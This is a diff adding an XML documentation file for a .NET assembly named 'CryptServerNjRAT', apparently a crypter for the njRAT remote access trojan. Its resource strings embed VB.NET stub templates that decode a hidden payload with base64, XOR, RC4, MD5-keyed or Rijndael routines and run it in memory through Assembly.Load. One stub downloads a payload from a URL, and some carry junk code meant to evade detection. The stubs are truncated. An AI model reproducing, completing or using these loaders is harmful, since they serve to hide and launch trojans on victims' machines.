@@ -1,0 +1,215 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+CryptServerNjRAT
+</name>
+</assembly>
+<members>
+<member name="P:Crypt_Server_NjRAT.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources._xor">
+	<summary>
+  Looks up a localized string similar to Imports System.Security.Cryptography
+Imports System.Text
+
+Module omar_iraq
+
+
+    Sub main()
+
+        Dim %1% As String = "%2%"
+
+
+
+
+        Dim %3% As Byte() = %5%(Convert.FromBase64String(%1%), "%8%")
+
+
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+   Public Function %5%(ByVal BB As Byte(), ByVal CC As String) As Byte()
+        Dim AA As Byte() = System.Text.Encoding.ASCII.GetByte [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.dwonloder">
+	<summary>
+  Looks up a localized string similar to Imports System.Security.Cryptography
+Imports System.Text
+Imports System.IO
+
+Module %1%
+
+
+    Sub main()
+
+        Dim %2% As New Net.WebClient()
+		   Try
+
+
+        Catch ex As Exception
+            Dim kdfjkjf As Double = 985786857867
+            Dim lofdfdf As String = "sdo;ifj;slkdjf;skjdfjksd;fkj"
+            Dim hhhhhh As String = "asdfasdfkj;lkjfdkjsd;fkjfd"
+
+        End Try
+
+
+        Dim %3% As String = %2%.DownloadString("%100%")
+
+
+
+        Dim %4% As Byte() = Convert.FromBase [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.HEXENTRYBOINT">
+	<summary>
+  Looks up a localized string similar to Module %1%
+
+    Dim %2% As String
+    Dim %3% As Byte()
+	    Sub main()
+
+	 
+        %3% = %5%(%2%)
+
+
+        Dim %4% As Object = Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+				
+    End Sub
+
+    Function %5%(ByVal %8% As String) As Byte()
+        Dim %6%
+        Dim %7%() As Byte
+        %8% = Replace(%8%, " ", "")
+        ReDim %7%((Len(%8%) \ 2) - 1)
+        For %6% = 0 To UBound(%7%) - 2
+            %7%(%6%) = CLng("&amp;H" &amp; Mid$(%8%, 2 * %6% + 1, 2))
+ [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.MD5">
+	<summary>
+  Looks up a localized string similar to Imports System.Security.Cryptography
+Imports System.Text
+
+Module omar_iraq
+
+    Sub main()
+
+        Dim %1% As String = "%2%"
+
+
+
+
+        Dim %3% As Byte() = %5%(Convert.FromBase64String(%1%), "%6%")
+
+
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+    Public Function %5%(ByVal bytData() As Byte, _
+        ByVal sKey As String, _
+          Optional ByVal tMode As CipherMode = Ciphe [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.MD51">
+	<summary>
+  Looks up a localized string similar to Imports System.Security.Cryptography
+Imports System.Text
+
+Module omar_iraq
+
+    Sub main()
+
+        Dim %1% As String = "%2%"
+
+
+
+
+        Dim %3% As Byte() = %5%(Convert.FromBase64String(%1%), "%8%")
+
+
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+    Public Function %5%(ByVal bytData() As Byte, ByVal sKey As String, Optional ByVal tMode As CipherMode = CipherMode.ECB, Optional ByVa [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.RC4">
+	<summary>
+  Looks up a localized string similar to Imports System.Security.Cryptography
+Imports System.Text
+
+Module omar_iraq
+
+
+    Sub main()
+
+        Dim %1% As String = "%2%"
+
+
+
+
+        Dim %3% As Byte() = %5%(Convert.FromBase64String(%1%), "%8%")
+
+
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+    Public Function %5%(ByVal D1 As Byte(), ByVal D2 As String) As Byte()
+        Dim D3 As Byte() = System.Text.Encoding.ASCII.GetByt [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypt_Server_NjRAT.My.Resources.Resources.RijndaelDecrypt">
+	<summary>
+  Looks up a localized string similar to     Imports System.Security.Cryptography
+
+Module omar_iraq
+	Sub main()
+	    
+        Dim %1% As String = "%2%"
+        Dim %3% As Byte() = Convert.FromBase64String(%6%(%1% , "%8%"))
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3% )
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+    Public Function %6%(ByVal UDecryptU As String, ByVal UKeyU As String)
+        Dim %7% As New RijndaelManaged
+        Dim XbtCipherX() As Byte
+        Dim Xbt [rest of string was truncated]";.
+</summary>
+</member><member name="T:Crypt_Server_NjRAT.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
